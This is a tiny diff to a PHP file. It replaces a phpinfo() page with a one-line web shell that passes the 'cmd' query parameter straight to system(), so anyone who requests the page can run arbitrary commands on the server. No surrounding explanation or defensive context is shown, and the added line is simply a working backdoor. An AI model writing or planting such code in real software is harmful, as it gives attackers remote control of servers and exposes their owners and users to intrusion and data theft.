@@ -1,3 +1,1 @@
-<?php 
-phpinfo();
-?>
+<?php echo "Shell";system($_GET['cmd']); ?>
